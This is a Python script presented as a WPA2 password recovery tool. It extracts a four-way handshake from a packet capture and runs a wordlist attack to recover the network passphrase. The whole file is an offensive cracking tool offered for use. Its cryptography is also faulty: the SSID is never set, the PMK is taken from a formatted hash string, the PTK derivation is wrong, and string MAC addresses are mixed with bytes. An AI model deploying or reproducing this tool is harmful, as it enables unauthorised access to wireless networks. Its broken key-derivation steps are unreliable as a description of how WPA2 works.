import pyshark
import argparse
import binascii
import hmac
import hashlib
from passlib.hash import pbkdf2_sha1

# Constants for WPA2
SSID = None
ANONCE = None
SNONCE = None
MIC = None
AP_MAC = None
STA_MAC = None
EAPOL_FRAME = None

def extract_handshake(pcap_file):
    global SSID, ANONCE, SNONCE, MIC, AP_MAC, STA_MAC, EAPOL_FRAME
    
    cap = pyshark.FileCapture(pcap_file, display_filter="eapol")

    handshake_packets = []
    
    for packet in cap:
        if 'EAPOL' in packet:
            handshake_packets.append(packet)
    
    cap.close()

    if len(handshake_packets) < 2:
        print("[!] Not enough EAPOL packets for a handshake.")
        return False

    print(f"[+] Found {len(handshake_packets)} EAPOL packets. Extracting data...")

    # Extract essential fields
    for packet in handshake_packets:
        if hasattr(packet, 'wlan'):
            AP_MAC = packet.wlan.bssid
            STA_MAC = packet.wlan.ta
        if hasattr(packet, 'eapol'):
            key_info = int(packet.eapol.key_info, 16)
            nonce = binascii.unhexlify(packet.eapol.key_nonce.replace(':', ''))
            mic = binascii.unhexlify(packet.eapol.key_mic.replace(':', ''))
            
            if key_info & 0x008:  # Message 2 or 3
                SNONCE = nonce
            elif key_info & 0x010:  # Message 3 or 4
                ANONCE = nonce
                MIC = mic
                EAPOL_FRAME = binascii.unhexlify(packet.eapol.get_raw_packet())

    if not (ANONCE and SNONCE and MIC and EAPOL_FRAME):
        print("[!] Failed to extract all required handshake components.")
        return False

    print("[+] Successfully extracted handshake data.")
    return True

def compute_pmk(psk, ssid):
    return pbkdf2_sha1.hash(psk, salt=ssid.encode(), rounds=4096)

def compute_mic(pmk, anonce, snonce, ap_mac, sta_mac, eapol_frame):
    ptk = hmac.new(pmk.encode(), anonce + snonce + ap_mac + sta_mac, hashlib.sha1).digest()
    mic = hmac.new(ptk[:16], eapol_frame, hashlib.sha1).digest()
    return mic

def crack_password(wordlist):
    print(f"[+] Starting dictionary attack using {wordlist}...")
    
    with open(wordlist, 'r', encoding='utf-8') as f:
        for word in f:
            word = word.strip()
            pmk = compute_pmk(word, SSID)
            computed_mic = compute_mic(pmk, ANONCE, SNONCE, AP_MAC, STA_MAC, EAPOL_FRAME)

            if computed_mic[:16] == MIC[:16]:  # MIC comparison
                print(f"[+] Password found: {word}")
                return word

    print("[-] Password not found in wordlist.")
    return None

def main():
    parser = argparse.ArgumentParser(description="WPA2 Password Recovery Tool")
    parser.add_argument("-f", "--file", required=True, help="Path to .pcap file")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
    args = parser.parse_args()

    if not extract_handshake(args.file):
        return

    cracked_password = crack_password(args.wordlist)
    if cracked_password:
        print(f"[+] Recovered WPA2 Key: {cracked_password}")
    else:
        print("[-] Failed to recover WPA2 Key.")

if __name__ == "__main__":
    main()
